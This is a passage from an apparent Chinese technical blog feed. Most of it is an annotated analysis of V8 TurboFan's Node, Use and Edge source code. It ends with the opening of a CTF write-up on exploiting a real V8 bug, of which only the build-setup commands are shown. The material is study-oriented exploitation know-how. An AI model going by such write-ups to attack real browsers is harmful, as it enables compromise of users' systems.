class="comment">//     ^       + outline ------------------+</span></span><br><span class="line"><span class="comment">//     +----------------------------------------+</span></span><br><span class="line"><span class="comment">//                                         |    |</span></span><br><span class="line"><span class="comment">//                                         v    | node</span></span><br><span class="line"><span class="comment">// |Use #N  |Use #N-1|...|Use #1  |Use #0  |OOL xxxxx |I#0|I#1|...|I#N-1|I#N|</span></span><br><span class="line"><span class="comment">//          ^                                                 ^</span></span><br><span class="line"><span class="comment">//          + Use                                             + Input</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Out-of-line storage of input lists is needed if appending an input to</span></span><br><span class="line"><span class="comment">// a node exceeds the maximum inline capacity.</span></span><br><span class="line"><span class="comment">// 如果向Node附加input超过最大inline容量，则需要input list的外部存储。</span></span><br></pre></td></tr></table></figure></p><p>input指针开始的位置是在node实例的后面(高地址处):<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Address Node::inputs_location() <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) + <span class="keyword">sizeof</span>(Node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>为某个node增加input:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Node::AppendInput(Zone* zone, Node* new_to) &#123;</span><br><span class="line">DCHECK_NOT_NULL(zone);</span><br><span class="line">DCHECK_NOT_NULL(new_to);</span><br><span class="line"><span class="keyword">int</span> inline_count = InlineCountField::decode(bit_field_);</span><br><span class="line"><span class="keyword">int</span> inline_capacity = InlineCapacityField::decode(bit_field_);</span><br><span class="line"><span class="keyword">if</span> (inline_count &lt; inline_capacity) &#123;</span><br><span class="line"><span class="comment">// Append inline input.</span></span><br><span class="line">bit_field_ = InlineCountField::update(bit_field_, inline_count + <span class="number">1</span>);</span><br><span class="line">*GetInputPtr(inline_count) = new_to; <span class="comment">//最新的位置赋值一个node指针(新增加的input)</span></span><br><span class="line">Use* use = GetUsePtr(inline_count);</span><br><span class="line">use-&gt;bit_field_ = Use::InputIndexField::encode(inline_count) | <span class="comment">//这里记录了index</span></span><br><span class="line">Use::InlineField::encode(<span class="literal">true</span>); </span><br><span class="line">new_to-&gt;AppendUse(use);<span class="comment">//将该use添加到新添加的input(node)的use链表中</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Append out-of-line input.</span></span><br><span class="line">…</span><br><span class="line">&#125;</span><br><span class="line">Verify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>添加use到链表使用的AppendUse函数:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Node::AppendUse(Use* use) &#123;</span><br><span class="line">  ...</span><br><span class="line">use-&gt;next = first_use_;</span><br><span class="line">use-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">if</span> (first_use_) first_use_-&gt;prev = use;</span><br><span class="line">first_use_ = use;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>node实例的低地址处存储的直接是多个struct Use，不是指针，通过New函数可以看出来:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Node* Node::New(Zone* zone, NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span><br><span class="line">                Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> has_extensible_inputs) &#123;</span><br><span class="line">  Node** input_ptr;</span><br><span class="line">  Use* use_ptr;</span><br><span class="line">  Node* node;</span><br><span class="line">  <span class="keyword">bool</span> is_inline;</span><br><span class="line">  ....</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_count &gt; kMaxInlineCapacity) &#123;</span><br><span class="line">    <span class="comment">// Allocate out-of-line inputs.</span></span><br><span class="line">    ....</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Allocate node with inline inputs. Capacity must be at least 1 so that</span></span><br><span class="line">    <span class="comment">// an OutOfLineInputs pointer can be stored when inputs are added later.</span></span><br><span class="line">    <span class="keyword">int</span> capacity = <span class="built_in">std</span>::max(<span class="number">1</span>, input_count);</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> max = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::min(input_count + <span class="number">3</span>, max);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Node的大小 + 容量*（Node指针大小 + Use结构体大小）*/</span></span><br><span class="line">    <span class="keyword">size_t</span> size = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line">    <span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(size));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 前面低地址处用来存储Use，中间是Node实例，后面高地址处存放Node指针 </span></span><br><span class="line"><span class="comment">     * raw_buffer + 容量*Use结构体的大小后才是Node实例的空间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*在指定位置(node_buffer)分配Node的空间*/</span></span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, input_count, capacity);</span><br><span class="line">    input_ptr = node-&gt;inline_inputs(); <span class="comment">//input指针开始的位置</span></span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(node);</span><br><span class="line">    is_inline = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Initialize the input pointers and the uses.</span></span><br><span class="line">  <span class="comment">// 这里代码和AppendInput差不多</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">    Node* to = *inputs++;</span><br><span class="line">    input_ptr[current] = to;</span><br><span class="line">    Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">    use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br><span class="line">    to-&gt;AppendUse(use);</span><br><span class="line">  &#125;</span><br><span class="line">  node-&gt;Verify();</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="graph"><a href="#graph" class="headerlink" title="graph:"></a>graph:</h4><p>假设在turbolizer显示的图像大致如下:<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   input_0          input_1</span><br><span class="line">      |<span class="string">                </span>|</span><br><span class="line">      |<span class="string">________________</span>|</span><br><span class="line">              |</span><br><span class="line"><span class="string">(use_1,use_0</span>|<span class="string">node</span>|<span class="string">input_0_ptr,input_1_ptr)</span></span><br></pre></td></tr></table></figure></p><p>input在node的上面<br>graph创建类:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSONGraphEdgeWriter</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  JSONGraphEdgeWriter(<span class="built_in">std</span>::ostream&amp; os, Zone* zone, <span class="keyword">const</span> Graph* graph)</span><br><span class="line">      : os_(os), all_(zone, graph, <span class="literal">false</span>), first_edge_(<span class="literal">true</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Node* <span class="keyword">const</span> node : all_.reachable) PrintEdges(node);</span><br><span class="line">    os_ &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrintEdges</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*按顺序遍历该node的input*/</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; node-&gt;InputCount(); i++) &#123;</span><br><span class="line">      Node* input = node-&gt;InputAt(i);</span><br><span class="line">      <span class="keyword">if</span> (input == <span class="literal">nullptr</span>) <span class="keyword">continue</span>;</span><br><span class="line">      PrintEdge(node, i, input);</span><br><span class="line">      <span class="comment">/*from = node , to = input*/</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrintEdge</span><span class="params">(Node* from, <span class="keyword">int</span> index, Node* to)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (first_edge_) &#123;</span><br><span class="line">      first_edge_ = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      os_ &lt;&lt; <span class="string">",\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* edge_type = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; NodeProperties::FirstValueIndex(from)) &#123;</span><br><span class="line">      edge_type = <span class="string">"unknown"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index &lt; NodeProperties::FirstContextIndex(from)) &#123;</span><br><span class="line">      edge_type = <span class="string">"value"</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/*to是source，from是target*/</span></span><br><span class="line">    os_ &lt;&lt; <span class="string">"&#123;\"source\":"</span> &lt;&lt; SafeId(to) &lt;&lt; <span class="string">",\"target\":"</span> &lt;&lt; SafeId(from)</span><br><span class="line">        &lt;&lt; <span class="string">",\"index\":"</span> &lt;&lt; index &lt;&lt; <span class="string">",\"type\":\""</span> &lt;&lt; edge_type &lt;&lt; <span class="string">"\"&#125;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">std</span>::ostream&amp; os_;</span><br><span class="line">  AllNodes all_;</span><br><span class="line">  <span class="keyword">bool</span> first_edge_;</span><br><span class="line">  ..</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>–trace-turbo生成的json:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;"source":29,"target":31,"index":0,"type":"value"&#125;,</span><br><span class="line">&#123;"source":30,"target":31,"index":1,"type":"value"&#125;,</span><br></pre></td></tr></table></figure></p><p>再结合生成的图像可知source在上方，target在下方，即to是input，from是target.<br><img src="/2019/08/19/v8-graph-node部分源码分析/图1.png" alt=""></p><h4 id="use的存储"><a href="#use的存储" class="headerlink" title="use的存储"></a>use的存储</h4><p>一个node实例有两个地方存储 Use.<br>第一个地方是node实例的低地址处，这里直接存储的Use实例：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use_1 use_0 | <span class="keyword">node</span><span class="title">实例 | input_0</span> input_1 </span><br><span class="line">   low addr                high addr</span><br></pre></td></tr></table></figure></p><p>另一个地方是: node实例中存储着一个Use链表，链表头是 first_use_ ，use的添加，插入，删除就是类中的AppendUse，InsertUse等函数.<br>例如 input_0 会把 use_0 放入到自己的链表中, input_1会把 use_1放入到自己的链表中.这样通过input可以找到node，通过node也可以找到input</p><h4 id="如何遍历use-edge："><a href="#如何遍历use-edge：" class="headerlink" title="如何遍历use_edge："></a>如何遍历use_edge：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Edge edge : node-&gt;use_edges()) &#123;<span class="comment">//这里的node即是input</span></span><br><span class="line">    Node* <span class="keyword">const</span> user = edge.from(); <span class="comment">//获得target.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历的是该node实例中的以first_use_为链表头的use链表.每一次以该链表中的use和该use对应的input来初始化Edge，通过这个Edge实例，可以获得use所在域中的node实例：<br><img src="/2019/08/19/v8-graph-node部分源码分析/图2.png" alt=""></p><p>Node类中的UseEdges类:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">UseEdges</span> <span class="title">final</span> &#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">using</span> value_type = Edge;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">iterator</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> iterator <span class="title">begin</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> iterator <span class="title">end</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    explicit UseEdges(Node* node) : node_(node) &#123;&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    Node* node_;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function">UseEdges <span class="title">use_edges</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> UseEdges(<span class="keyword">this</span>); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*用UseEdges中的node_初始化iterator*/</span></span><br><span class="line">  Node::UseEdges::iterator Node::UseEdges::begin() <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> Node::UseEdges::iterator(<span class="keyword">this</span>-&gt;node_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node::UseEdges::iterator Node::UseEdges::end() <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> Node::UseEdges::iterator();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>UseEdges类中的iterator类：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A forward iterator to visit the uses edges of a node.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span>:UseEdges::iterator final &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  iterator(<span class="keyword">const</span> iterator&amp; other) = <span class="keyword">default</span>;</span><br><span class="line">  </span><br><span class="line">  Edge <span class="keyword">operator</span>*() <span class="keyword">const</span> &#123; <span class="keyword">return</span> Edge(current_, current_-&gt;input_ptr()); &#125;</span><br><span class="line">  <span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> iterator&amp; other) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> current_ == other.current_;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">bool</span> <span class="keyword">operator</span>!=(<span class="keyword">const</span> iterator&amp; other) <span class="keyword">const</span> &#123; <span class="keyword">return</span> !(*<span class="keyword">this</span> == other); &#125;</span><br><span class="line">  iterator&amp; <span class="keyword">operator</span>++() &#123;</span><br><span class="line">    DCHECK_NOT_NULL(current_);</span><br><span class="line">    current_ = next_;</span><br><span class="line">    next_ = current_ ? current_-&gt;next : <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iterator <span class="keyword">operator</span>++(<span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span>:UseEdges;</span><br><span class="line"></span><br><span class="line">  iterator() : current_(<span class="literal">nullptr</span>), next_(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">iterator</span><span class="params">(Node* node)</span></span></span><br><span class="line">      : current_(node-&gt;first_use_),</span><br><span class="line">        next_(current_ ? current_-&gt;next : <span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  Node::Use* current_; <span class="comment">//first use</span></span><br><span class="line">  Node::Use* next_; <span class="comment">// first_use -&gt; next</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用iterator这个类来遍历Node实例中的use链表，即链表头为first_use_的链表</p><p>Use_Edges::iterator的初始化:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">iterator</span><span class="params">(Node* node)</span></span></span><br><span class="line">      : current_(node-&gt;first_use_),</span><br><span class="line">        next_(current_ ? current_-&gt;next : <span class="literal">nullptr</span>) &#123;&#125;</span><br></pre></td></tr></table></figure></p><p>使用node实例的first_use_来初始化current_ ,即将use链表头赋值给current.</p><p>看下Node类中的结构体Use:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Use</span> &#123;</span></span><br><span class="line">   Use* next;</span><br><span class="line">   Use* prev;</span><br><span class="line">   <span class="keyword">uint32_t</span> bit_field_;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">input_index</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> InputIndexField::decode(bit_field_); &#125;</span><br><span class="line">   <span class="function"><span class="keyword">bool</span> <span class="title">is_inline_use</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> InlineField::decode(bit_field_); &#125;</span><br><span class="line">   <span class="function">Node** <span class="title">input_ptr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> index = input_index();<span class="comment">//获得Appendinput时对应的index</span></span><br><span class="line">     Use* start = <span class="keyword">this</span> + <span class="number">1</span> + index;<span class="comment">//获得该Use所在的域中的Node实例的地址</span></span><br><span class="line">     Node** inputs = is_inline_use() <span class="comment">//获取对应的input的位置</span></span><br><span class="line">                         ? <span class="keyword">reinterpret_cast</span>&lt;Node*&gt;(start)-&gt;inline_inputs()</span><br><span class="line">                         : <span class="keyword">reinterpret_cast</span>&lt;OutOfLineInputs*&gt;(start)-&gt;inputs();</span><br><span class="line">     <span class="keyword">return</span> &amp;inputs[index];<span class="comment">//返回指向该Use对应的input的指针的指针</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*获得该Use所在的域中的Node实例的地址*/</span></span><br><span class="line">   <span class="function">Node* <span class="title">from</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     Use* start = <span class="keyword">this</span> + <span class="number">1</span> + input_index();</span><br><span class="line">     <span class="keyword">return</span> is_inline_use() ? <span class="keyword">reinterpret_cast</span>&lt;Node*&gt;(start)</span><br><span class="line">                            : <span class="keyword">reinterpret_cast</span>&lt;OutOfLineInputs*&gt;(start)-&gt;node_;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>使用该iterator每一次返回的是Edge实例:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Edge <span class="keyword">operator</span>*() <span class="keyword">const</span> &#123; <span class="keyword">return</span> Edge(current_, current_-&gt;input_ptr()); &#125;</span><br></pre></td></tr></table></figure></p><p>这里使用Use和该Use对应的input_node来初始化Edge</p><p>Edge类如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Edge</span> <span class="title">final</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function">Node* <span class="title">from</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> use_-&gt;from(); &#125;</span><br><span class="line">  <span class="function">Node* <span class="title">to</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> *input_ptr_; &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line">  Edge(Node::Use* use, Node** input_ptr) : use_(use), input_ptr_(input_ptr) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  Node::Use* use_; </span><br><span class="line">  Node** input_ptr_; <span class="comment">//上面use_对应的&amp;input</span></span><br><span class="line">&#125;;<span class="comment">//Edge</span></span><br></pre></td></tr></table></figure><p>struct Use中from的定义如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*获得该Use所在的域中的Node实例的地址</span></span><br><span class="line"><span class="comment"> * use | node | input</span></span><br><span class="line"><span class="comment"> *       ^</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Node* <span class="title">from</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Use* start = <span class="keyword">this</span> + <span class="number">1</span> + input_index();</span><br><span class="line">  <span class="keyword">return</span> is_inline_use() ? <span class="keyword">reinterpret_cast</span>&lt;Node*&gt;(start)</span><br><span class="line">                         : <span class="keyword">reinterpret_cast</span>&lt;OutOfLineInputs*&gt;(start)-&gt;node_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里from得到的就是图中的target,to是图中的source.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;node&quot;&gt;&lt;a href=&quot;#node&quot; class=&quot;headerlink&quot; title=&quot;node:&quot;&gt;&lt;/a&gt;node:&lt;/h4&gt;&lt;p&gt;Node是graph的基本元素，graph中各node通过 input和use链 链接在一起&lt;br&gt;Node类大概如下：
      
    
    </summary>
    
    
      <category term="v8_Turbofan" scheme="http://yoursite.com/tags/v8-Turbofan/"/>
    
  </entry>
  
  <entry>
    <title>roll_a_d8-v8利用学习</title>
    <link href="http://yoursite.com/2019/07/02/roll-a-d8-v8%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/07/02/roll-a-d8-v8利用学习/</id>
    <published>2019-07-02T13:57:15.000Z</published>
    <updated>2019-09-22T02:09:51.972Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>之前花了一段时间学习解释器原理，然后开始学习js引擎的利用.分析一下plaidctf中的roll a d8，虽说是ctf题，但是是真实的漏洞. 由于我也是菜鸡初学者，理解和分析的会有偏差.<br>主要参考了以下文章:<br><a href="https://xz.aliyun.com/t/5190" target="_blank" rel="noopener">v8 exploit入门 PlaidCTF roll a d8</a><br>p4nda师傅的<a href="https://github.com/ret2p4nda/browser-pwn/tree/master/roll%20a%20d8" target="_blank" rel="noopener">Plaid CTF 2018 roll a d8</a><br><a href="https://www.anquanke.com/post/id/147829#h3-12" target="_blank" rel="noopener">扔个骰子学v8 - 从Plaid CTF roll a d8开始</a></p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h4><p>最好科学上网,或者在国外服务器上编译好然后打包拷到本地.<br>题目给了 issue: <a href="https://crbug.com/821137" target="_blank" rel="noopener">https://crbug.com/821137</a> , 找到修复漏洞的commit，然后将版本回退到打补丁之前.<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> v8</span><br><span class="line">git reset <span class="params">--hard</span> 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class="line"><span class="keyword">cd</span> <span class="string">..</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="keyword">cd</span> v8</span><br></pre></td></tr></table></figure></p><p>编译release版本:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 